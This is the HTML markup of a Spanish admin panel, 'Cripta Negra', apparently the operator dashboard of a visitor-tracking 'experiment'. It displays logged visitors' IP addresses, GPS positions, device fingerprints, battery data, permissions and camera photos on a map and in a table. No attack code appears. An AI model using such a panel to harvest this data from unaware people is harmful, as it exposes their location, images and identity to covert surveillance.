<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <meta name="robots" content="noindex, nofollow" />
  <title>Panel · Cripta Negra</title>
  <link rel="stylesheet" href="/css/base.css" />
  <link rel="stylesheet" href="/css/panel.css" />
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
</head>
<body>
  <!-- LOGIN -->
  <div class="login-wrap" id="loginWrap">
    <form class="login" id="loginForm">
      <h1 class="wordmark">Cripta</h1>
      <p>Panel del responsable del experimento</p>
      <div class="field">
        <label>Usuario</label>
        <input type="text" id="user" autocomplete="username" />
      </div>
      <div class="field">
        <label>Contraseña</label>
        <input type="password" id="pass" autocomplete="current-password" />
      </div>
      <button class="btn btn-blood" type="submit">Entrar</button>
      <div class="err" id="err"></div>
    </form>
  </div>

  <!-- DASHBOARD -->
  <div class="dash" id="dash">
    <div class="dash-top">
      <h1 class="wordmark">Visitas registradas</h1>
      <div class="dash-actions">
        <button class="btn btn-ghost" id="refreshBtn">Actualizar</button>
        <button class="btn btn-blood" id="clearBtn">Borrar todo</button>
        <button class="btn btn-ghost" id="logoutBtn">Salir</button>
      </div>
    </div>

    <div class="stats">
      <div class="stat"><div class="n" id="stTotal">0</div><div class="l">Visitas totales</div></div>
      <div class="stat"><div class="n" id="stGps">0</div><div class="l">Aceptaron GPS</div></div>
      <div class="stat"><div class="n" id="stPhoto">0</div><div class="l">Con foto</div></div>
    </div>

    <div id="map"></div>

    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>#</th><th>Fecha</th><th>IP</th><th>Ubic. IP</th><th>GPS</th>
            <th>Dispositivo</th><th>Pantalla</th><th>CPU/RAM</th><th>GPU</th>
            <th>Zona/Idioma</th><th>Batería</th><th>Huella</th><th>Permisos</th><th>Foto</th><th>User-Agent</th>
          </tr>
        </thead>
        <tbody id="rows"></tbody>
      </table>
      <div class="empty" id="empty" style="display:none">Aún no hay visitas registradas.</div>
    </div>
  </div>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script src="/js/panel.js"></script>
</body>
</html>
